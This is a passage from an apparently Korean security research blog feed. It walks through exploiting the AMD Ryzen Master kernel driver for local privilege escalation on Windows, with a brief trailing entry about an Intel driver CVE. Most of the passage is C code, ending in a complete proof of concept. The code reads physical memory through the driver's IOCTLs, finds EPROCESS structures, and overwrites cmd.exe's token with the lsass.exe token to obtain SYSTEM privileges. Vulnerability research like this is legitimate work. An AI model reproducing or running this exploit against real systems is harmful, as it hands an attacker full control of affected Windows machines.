&amp;dwRet, <span class="hljs-number">0</span>);INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;</code></pre><p><code>input_buff</code>&#xC5D0;&#xB294; &#xBB3C;&#xB9AC; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC640; &#xAE38;&#xC774;(<code>0x1000</code>)&#xB97C; &#xC8FC;&#xACE0;, <code>output_buff</code>&#xC5D0; &#xCDA9;&#xBD84;&#xD55C; &#xACF5;&#xAC04;&#xC744; &#xD560;&#xB2F9;&#xD574; <code>DeviceIoControl</code> &#xD568;&#xC218;&#xB85C; <code>0x81112F08</code> IOCTL &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.  <code>0x81112F08</code> &#xC740; METHOD_BUFFERED &#xB85C; input&#xACFC; output &#xBC84;&#xD37C;&#xB97C; &#xACF5;&#xC720;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; IOCTL &#xACB0;&#xACFC; &#xBC84;&#xD37C;&#xC5D0; Input&#xAC12;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>output_buff</code>&#xC5D0; <code>0xc</code> (<code>INT64 read_address(0x8) + DWORD len(0x4)</code>) &#xB9CC;&#xD07C; &#xB354;&#xD55C; &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC774; IOCTL &#xC694;&#xCCAD;&#xC758; &#xACB0;&#xACFC;&#xAC12;&#xC778; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xB418;&#xACE0; <code>result</code>&#xB85C; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p><p><br></p><pre><code class="hljs c"><span class="hljs-keyword">for</span> (INT64 j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0xF60</span>; j += <span class="hljs-number">0x10</span>) { <span class="hljs-comment">// Searching Proc Tag</span>PINT64 proc_ptr = (PINT64)(result + <span class="hljs-number">0x4</span> + j);INT32 proc_val = *(PINT32)proc_ptr<span class="hljs-keyword">if</span> (proc_val == <span class="hljs-number">0x636f7250</span>) { <span class="hljs-keyword">for</span> (INT64 k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">0xA0</span>; k += <span class="hljs-number">0x10</span>) { <span class="hljs-comment">//Searching marker (0x00000003</span>PINT64 header_ptr = (PINT64)(result + j + k);INT32 header_val = *(PINT32)header_ptr;<span class="hljs-keyword">if</span> (header_val == <span class="hljs-number">0x00000003</span>) {<span class="hljs-comment">// save Proc chunk</span>INT64 tmp = read_address + j;INT64 modulus = tmp % <span class="hljs-number">0x1000</span>;proc_data.page_entry_offset[proc_data.proc_count] = modulus;proc_data.proc_address[proc_data.proc_count] = tmp - modulus;proc_data.header_size[proc_data.proc_count] = k;proc_data.proc_count++;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] Proc chunks found\\n&quot;</span>, proc_data.proc_count);}}            }}</code></pre><p>&#xC6B0;&#xC120; <code>result</code>&#xC5D0;&#xC11C; <code>0x10</code> aligned &#xB2E8;&#xC704;&#xB85C; &#xB8E8;&#xD504;&#xB97C; &#xB3CC;&#xBA70; <code>+0x4</code> &#xC704;&#xCE58; &#xC8FC;&#xC18C;&#xC758; &#xAC12;&#xC774; <code>0x635f7250</code>(Proc)&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. Proc &#xD0DC;&#xADF8;&#xB97C; &#xCC3E;&#xC558;&#xC73C;&#xBA74; &#xC774;&#xD6C4; <code>PROC_HEADER</code>&#xC758; &#xC608;&#xC0C1; &#xCD5C;&#xB300; &#xD06C;&#xAE30;&#xC778; &#xC57D; <code>0xA0</code>&#xAE4C;&#xC9C0; <code>0x10</code> &#xB2E8;&#xC704;&#xB85C; &#xB8E8;&#xD504;&#xB97C; &#xD55C; &#xBC88; &#xB354; &#xB3CC;&#xBA74;&#xC11C; <code>0x00000003</code> &#xAC12;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xCC3E;&#xACE0;, &#xCC3E;&#xC73C;&#xBA74; &#xD604;&#xC7AC;&#xAE4C;&#xC9C0; &#xAD6C;&#xD55C; Proc tag address &#xC640; page entry offset, header size&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAC12;&#xC73C;&#xB85C; &#xC774;&#xD6C4;&#xC5D0; &#xB2E4;&#xC2DC; <code>EPRCEOSS</code>&#xC758; &#xC704;&#xCE58;&#xB97C; &#xACC4;&#xC0B0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><br></p><p>&#xC774;&#xC81C; &#xC800;&#xC7A5;&#xB41C; <code>PROC_DATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xAC01; &#xBC30;&#xC5F4;&#xC5D0;&#xC11C; <code>EPROCESS</code> &#xC758; &#xAC01; &#xD544;&#xB4DC;&#xAC12;(<code>ImageFileName</code>, <code>Token</code>, <code>UniqueProcessId</code>)&#xC744; &#xAD6C;&#xD558;&#xACE0; <code>cmd.exe</code>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>Token</code> &#xC8FC;&#xC18C;&#xC640; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>Token</code> &#xAC12;&#xC744; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">parse_proc</span><span class="hljs-params">(PROC_DATA proc_data, HANDLE dHandle)</span> </span>{    DWORD bytes_ret = <span class="hljs-number">0</span>;    DWORD num_of_bytes = <span class="hljs-number">0x1000</span>;    LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100c</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; proc_data.proc_count; i++) {        INT64 read_address = proc_data.proc_address[i];        READ_INPUT_BUFFER input_buff = { read_address, num_of_bytes };        DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);        INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;        INT64 EPROCESS = result + proc_data.page_entry_offset[i] + proc_data.header_size[i];                INT64 imagename_address = EPROCESS + <span class="hljs-number">0x5a8</span>; <span class="hljs-comment">//ImageFileName</span>        INT64 imagename_value = *(PINT64)imagename_address;        INT64 proc_token_addr = EPROCESS + <span class="hljs-number">0x4b8</span>; <span class="hljs-comment">//Token</span>        INT64 proc_token = *(PINT64)proc_token_addr;        INT64 pid_addr = EPROCESS + <span class="hljs-number">0x440</span>; <span class="hljs-comment">//UniqueProcessId</span>        INT64 pid_value = *(PINT64)pid_addr;<span class="hljs-keyword">if</span>(imagename_value == <span class="hljs-number">0x78652e737361736c</span>) {  <span class="hljs-comment">//lsass.exe - system process</span>system_token_value = proc_token;}        <span class="hljs-keyword">if</span> (imagename_value == <span class="hljs-number">0x6578652e646d63</span>) {   <span class="hljs-comment">//cmd.exe - target process</span>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cmd.exe found!!\\n&quot;</span>);        cmd_token_addr = (read_address + proc_data.header_size[i] + proc_data.page_entry_offset[i] + <span class="hljs-number">0x4b8</span>);        }    }}</code></pre><p><code>proc_address &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C; + page entry offset + header size</code> &#xAC00; <code>EPROCESS</code>&#xC758; &#xC704;&#xCE58;&#xAC00; &#xB418;&#xBA70; &#xC0AC;&#xC804;&#xC5D0; &#xAD6C;&#xD55C; <code>EPROCESS</code>&#xC758; &#xAC01; &#xD544;&#xB4DC;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xB354;&#xD574; <code>Token</code>&#xACFC; <code>ImageFileName</code>&#xC744; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>ImageFileName</code>&#xC774; <code>cmd.exe</code>&#xBA74; &#xD574;&#xB2F9; <code>EPROCESS</code>&#xC758; <code>Token</code> &#xD544;&#xB4DC; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0;, &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4; <code>lsass.exe</code>&#xBA74; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>Token</code> &#xD544;&#xB4DC;&#xC758; &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><br></p><h2 id="Overwrite-Token"><a href="#Overwrite-Token" class="headerlink" title="Overwrite Token"></a>Overwrite Token</h2><p>&#xC774;&#xC81C; &#xC774;&#xC804; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xD55C; &#xAC83; &#xCC98;&#xB7FC; <code>lsass.exe</code>&#xC758; <code>Token</code>&#xAC12;&#xC744; <code>cmd.exe</code>&#xC758; <code>Token</code> &#xD544;&#xB4DC;&#xC5D0; overwrite&#xD558;&#xBA74; <code>cmd.exe</code>&#xC758; &#xAD8C;&#xD55C;&#xC744; <code>NT AUTORITY\SYSTEM</code>&#xC73C;&#xB85C; &#xBC14;&#xAFD4; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">overwrite_token</span><span class="hljs-params">(HANDLE dHandle)</span> </span>{    DWORD modulus = cmd_token_addr % <span class="hljs-number">0x1000</span>;    INT64 cmd_page = cmd_token_addr - modulus;    DWORD bytes_ret = <span class="hljs-number">0x0</span>;    DWORD read_num_bytes = modulus;    PBYTE output_buff = (PBYTE)VirtualAlloc(<span class="hljs-literal">NULL</span>, modulus + <span class="hljs-number">0xc</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    READ_INPUT_BUFFER input_buff = { cmd_page, read_num_bytes };    DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, modulus + <span class="hljs-number">0xc</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);    PBYTE results = (PBYTE)((INT64)output_buff + <span class="hljs-number">0xc</span>);    PBYTE cmd_page_buff = (PBYTE)VirtualAlloc(<span class="hljs-literal">NULL</span>, modulus + <span class="hljs-number">0x8</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    DWORD num_of_bytes = modulus + <span class="hljs-number">0x8</span>;<span class="hljs-comment">// page pool ~ before token</span>    <span class="hljs-built_in">memcpy</span>(cmd_page_buff, results, modulus);<span class="hljs-comment">// new token value </span>    <span class="hljs-built_in">memcpy</span>(cmd_page_buff + modulus, (<span class="hljs-keyword">void</span>*)&amp;system_token_value, <span class="hljs-number">0x8</span>);    BYTE input_buff2[<span class="hljs-number">0x1000</span>] = { <span class="hljs-number">0</span>, };    <span class="hljs-built_in">memcpy</span>(input_buff2, (<span class="hljs-keyword">void</span>*)cmd_page, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memcpy</span>(input_buff2 + <span class="hljs-number">0x8</span>, (<span class="hljs-keyword">void</span>*)&amp;num_of_bytes, <span class="hljs-number">0x4</span>);    <span class="hljs-built_in">memcpy</span>(input_buff2 + <span class="hljs-number">0xc</span>, cmd_page_buff, modulus + <span class="hljs-number">0x8</span>);    DeviceIoControl(dHandle, WRITE_IOCTL, input_buff2, modulus + <span class="hljs-number">0x8</span> + <span class="hljs-number">0xc</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);}</code></pre><p>&#xC774;&#xB54C; &#xD55C; &#xAC00;&#xC9C0; &#xBB38;&#xC81C;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xB370;, Page &#xB2E8;&#xC704;&#xB85C; &#xB9E4;&#xD551;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; memory write&#xC758; &#xACBD;&#xC6B0; &#xC815;&#xD655;&#xD788; Token &#xAC12; 8 bytes&#xB9CC; overwrite&#xD560; &#xC218; &#xC5C6;&#xB2E4;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xACB0;&#xBC95;&#xC740; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;! Page pool&#xC758; &#xC2DC;&#xC791;&#xBD80;&#xD130; <code>Token</code> &#xC8FC;&#xC18C; &#xC804;&#xAE4C;&#xC9C0;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xAC12;&#xB4E4;&#xC744; <code>READ_IOCTL</code>&#xB85C; &#xBAA8;&#xB450; &#xAC00;&#xC838;&#xC640; &#xBC84;&#xD37C;&#xC5D0; &#xC800;&#xC7A5;&#xD55C; &#xB4A4;, &#xD574;&#xB2F9; &#xBC84;&#xD37C;&#xC5D0; overwrite&#xD560; &#xD1A0;&#xD070;&#xAC12;&#xB9CC; &#xCD94;&#xAC00;&#xD55C; &#xBC84;&#xD37C;&#xB97C; <code>WRITE_IOCTL 0x81112F0C</code>&#xC744; &#xD1B5;&#xD574; input&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xBA74; Page pool &#xC2DC;&#xC791;&#xC8FC;&#xC18C;&#xBD80;&#xD130; <code>Token</code> &#xC8FC;&#xC18C; &#xC804;&#xAE4C;&#xC9C0;&#xB294; exploit &#xC804;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xAC12;&#xC774; &#xC720;&#xC9C0;&#xB418;&#xACE0; &#xD1A0;&#xD070;&#xAC12;&#xB9CC; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><br></p><p>&#xC774;&#xC81C; cmd&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xBE4C;&#xB4DC;&#xD55C; PoC&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;..</p><p><img src="/2021/08/11/l0ch/windows-driver-part4/3.gif" alt></p><p>&#xC775;&#xC2A4; &#xC131;&#xACF5;!</p><p><br></p><p>&#xC544;&#xB798;&#xB294; &#xC804;&#xCCB4; PoC&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEVICE_NAME         <span class="hljs-meta-string">L&quot;\\\\.\\AMDRyzenMasterDriverV15&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WRITE_IOCTL         (DWORD)0x81112F0C</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> READ_IOCTL          (DWORD)0x81112F08</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> START_ADDRESS       (INT64)0x120000000</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> END_OF_ADDRESS      (INT64)0x240000000</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    INT64 start_address;    DWORD num_of_bytes;    <span class="hljs-keyword">char</span> receiving_buff[<span class="hljs-number">0x1000</span>];} READ_INPUT_BUFFER;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    INT64 proc_address[<span class="hljs-number">300</span>];    INT64 page_entry_offset[<span class="hljs-number">300</span>];    INT64 header_size[<span class="hljs-number">300</span>];    INT64 proc_count;} PROC_DATA;INT64 cmd_token_addr = <span class="hljs-number">0</span>;INT64 system_token_value = <span class="hljs-number">0</span>;<span class="hljs-function">PROC_DATA <span class="hljs-title">read_memory</span><span class="hljs-params">(HANDLE dHandle)</span></span><span class="hljs-function"></span>{    DWORD dwRet;    PROC_DATA proc_data = { <span class="hljs-number">0</span>, };        DWORD len = <span class="hljs-number">0x1000</span>;    INT64 i = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {        INT64 read_address = START_ADDRESS + (i * <span class="hljs-number">0x1000</span>);        <span class="hljs-keyword">if</span> (read_address &gt;= END_OF_ADDRESS) {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;END of Address\n&quot;</span>);            <span class="hljs-keyword">return</span> proc_data;        }        READ_INPUT_BUFFER input_buff = { read_address, len };        <span class="hljs-comment">//printf(&quot;read address: %p\n&quot;,read_address);</span>        LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100c</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);               DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>);                INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;        <span class="hljs-keyword">for</span> (INT64 j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0xF60</span>; j += <span class="hljs-number">0x10</span>) {            PINT64 proc_ptr = (PINT64)(result + <span class="hljs-number">0x4</span> + j);            INT32 proc_val = *(PINT32)proc_ptr;            <span class="hljs-keyword">if</span> (proc_val == <span class="hljs-number">0x636f7250</span>) {                <span class="hljs-keyword">for</span> (INT64 k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">0xA0</span>; k += <span class="hljs-number">0x10</span>) {                    PINT64 header_ptr = (PINT64)(result + j + k);                    INT32 header_val = *(PINT32)header_ptr;                    <span class="hljs-keyword">if</span> (header_val == <span class="hljs-number">0x00000003</span>) {                        INT64 tmp = read_address + j;                        INT64 modulus = tmp % <span class="hljs-number">0x1000</span>;                        proc_data.page_entry_offset[proc_data.proc_count] = modulus;                        proc_data.proc_address[proc_data.proc_count] = tmp - modulus;                        proc_data.header_size[proc_data.proc_count] = k;                        proc_data.proc_count++;                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%I64d] Proc found\n&quot;</span>, proc_data.proc_count);                    }                }                            }        }        i++;    }}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">parse_proc</span><span class="hljs-params">(PROC_DATA proc_data, HANDLE dHandle)</span> </span>{    DWORD bytes_ret = <span class="hljs-number">0</span>;    DWORD num_of_bytes = <span class="hljs-number">0x1000</span>;    LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100c</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; proc_data.proc_count; i++) {        INT64 read_address = proc_data.proc_address[i];        READ_INPUT_BUFFER input_buff = { read_address, num_of_bytes };        DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);        INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;        INT64 EPROCESS = result + proc_data.page_entry_offset[i] + proc_data.header_size[i];                INT64 imagename_address = EPROCESS + <span class="hljs-number">0x5a8</span>; <span class="hljs-comment">//ImageFileName</span>        INT64 imagename_value = *(PINT64)imagename_address;        INT64 proc_token_addr = EPROCESS + <span class="hljs-number">0x4b8</span>; <span class="hljs-comment">//Token</span>        INT64 proc_token = *(PINT64)proc_token_addr;        INT64 pid_addr = EPROCESS + <span class="hljs-number">0x440</span>; <span class="hljs-comment">//UniqueProcessId</span>        INT64 pid_value = *(PINT64)pid_addr;        <span class="hljs-keyword">if</span> (imagename_value == <span class="hljs-number">0x78652e737361736c</span>) {  <span class="hljs-comment">//lsass.exe - system process</span>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[&gt;] system process [%s] found\n&quot;</span>, (<span class="hljs-keyword">char</span>*)imagename_address);            system_token_value = proc_token;        }        <span class="hljs-keyword">if</span> (imagename_value == <span class="hljs-number">0x6578652e646d63</span>) {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[&gt;] [%s] found\n&quot;</span>, (<span class="hljs-keyword">char</span>*)imagename_address);            cmd_token_addr = (read_address + proc_data.header_size[i] + proc_data.page_entry_offset[i] + <span class="hljs-number">0x4b8</span>);        }    }}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">overwrite_token</span><span class="hljs-params">(HANDLE dHandle)</span> </span>{    DWORD modulus = cmd_token_addr % <span class="hljs-number">0x1000</span>;    INT64 cmd_page = cmd_token_addr - modulus;    DWORD bytes_ret = <span class="hljs-number">0x0</span>;    DWORD read_num_bytes = modulus;    PBYTE output_buff = (PBYTE)VirtualAlloc(<span class="hljs-literal">NULL</span>, modulus + <span class="hljs-number">0xc</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    READ_INPUT_BUFFER input_buff = { cmd_page, read_num_bytes };    DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, modulus + <span class="hljs-number">0xc</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);    PBYTE results = (PBYTE)((INT64)output_buff + <span class="hljs-number">0xc</span>);    PBYTE cmd_page_buff = (PBYTE)VirtualAlloc(<span class="hljs-literal">NULL</span>, modulus + <span class="hljs-number">0x8</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span class="hljs-built_in">memcpy</span>(cmd_page_buff, results, modulus);    <span class="hljs-built_in">memcpy</span>(cmd_page_buff + modulus, (<span class="hljs-keyword">void</span>*)&amp;system_token_value, <span class="hljs-number">0x8</span>);        DWORD num_of_bytes = modulus + <span class="hljs-number">0x8</span>;    BYTE input_buff2[<span class="hljs-number">0x1000</span>] = { <span class="hljs-number">0</span>, };    <span class="hljs-built_in">memcpy</span>(input_buff2, (<span class="hljs-keyword">void</span>*)&amp;cmd_page, <span class="hljs-number">0x8</span>);  <span class="hljs-comment">//Physical address</span>    <span class="hljs-built_in">memcpy</span>(input_buff2 + <span class="hljs-number">0x8</span>, (<span class="hljs-keyword">void</span>*)&amp;num_of_bytes, <span class="hljs-number">0x4</span>); <span class="hljs-comment">// Number of bytes</span>    <span class="hljs-built_in">memcpy</span>(input_buff2 + <span class="hljs-number">0xc</span>, cmd_page_buff, modulus + <span class="hljs-number">0x8</span>); <span class="hljs-comment">// Address to be copied</span>    DeviceIoControl(dHandle, WRITE_IOCTL, input_buff2, modulus + <span class="hljs-number">0x8</span> + <span class="hljs-number">0xc</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    HANDLE dHandle;    dHandle = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);    PROC_DATA proc_data;    <span class="hljs-keyword">if</span> (dHandle == INVALID_HANDLE_VALUE)    {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get Device Handle Fail : 0x%X \n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }    proc_data = read_memory(dHandle);    parse_proc(proc_data, dHandle);    <span class="hljs-keyword">if</span> (system_token_value == <span class="hljs-number">0</span> || cmd_token_addr == <span class="hljs-number">0</span>) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get cmd.exe/SYSTEM token Fail\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[&gt;] cmd.exe token address: 0x%llx\n&quot;</span>, cmd_token_addr);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[&gt;] Overwriting token with value: 0x%llx\n&quot;</span>, system_token_value);    overwrite_token(dHandle);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[&gt;] Complete\n&quot;</span>);    CloseHandle(dHandle);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xAE30;&#xCD08;&#xAC00; &#xBD80;&#xC2E4;&#xD574;&#xC11C; &#xBB3C;&#xB9AC;&#xBA54;&#xBAA8;&#xB9AC; &#x2194; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC774; &#xB9E4;&#xD551; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC81C;&#xB300;&#xB85C; &#xB2E4;&#xC2DC; &#xC774;&#xD574;&#xD558;&#xB290;&#xB77C; &#xACE0;&#xC0DD;&#xC744; &#xC880; &#xD55C; &#xAC70; &#xB9D0;&#xACE0;&#xB294;&#x2026; &#xBB34;&#xB09C;&#xD558;&#xAC8C; &#xBD84;&#xC11D;&#xD588;&#xB358; &#xAC83; &#xAC19;&#xB124;&#xC694;. &#xC5ED;&#xC2DC; &#xACF5;&#xBD80; &#xD55C;&#xBC88; &#xD560; &#xB54C; &#xC81C;&#xB300;&#xB85C; &#xD574;&#xB194;&#xC57C; &#xB098;&#xC911;&#xC5D0; &#xACE0;&#xC0DD;&#xC744; &#xC548;&#xD558;&#xC9C0;&#x3160;&#x3160;</p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xC815;&#xC0C1;&#xC801;&#xC778;(?) &#xC81C;&#xBAA9;&#xC758; &#xC2DC;&#xB9AC;&#xC988;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC548;&#xB155;~</p><blockquote><p>&#xC624;&#xB958; &#xBC0F; &#xC624;&#xD0C0;&#xC9C0;&#xC801;&#xC740; &#xB05D;&#xC5C6;&#xB294; &#xC0BD;&#xC9C8;&#xC5D0; &#xB3C4;&#xC6C0;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p></blockquote><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://h0mbre.github.io/RyzenMaster_CVE/">https://h0mbre.github.io/RyzenMaster_CVE/</a></li><li><a href="https://h0mbre.github.io/atillk64_exploit/">https://h0mbre.github.io/atillk64_exploit/</a></li><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmmapiospace">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmmapiospace</a></li><li><a href="https://movaxbx.ru/2020/10/14/cve-2020-12928-exploit-proof-of-concept-privilege-escalation-in-amd-ryzen-master-amdryzenmasterdriver-sys/">https://movaxbx.ru/2020/10/14/cve-2020-12928-exploit-proof-of-concept-privilege-escalation-in-amd-ryzen-master-amdryzenmasterdriver-sys/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>kernel</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>research</tag>
      
      <tag>windows driver</tag>
      
      <tag>third-party driver exploitation</tag>
      
      <tag>amd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-0090: INTEL 드라이버 및 지원 도우미의 권한상승 취약점</title>
    <link href="/2021/08/10/l0ch/2021-08-10/"/>
    <url>/2021/08/10/l0ch/2021-08-10/</url>
    
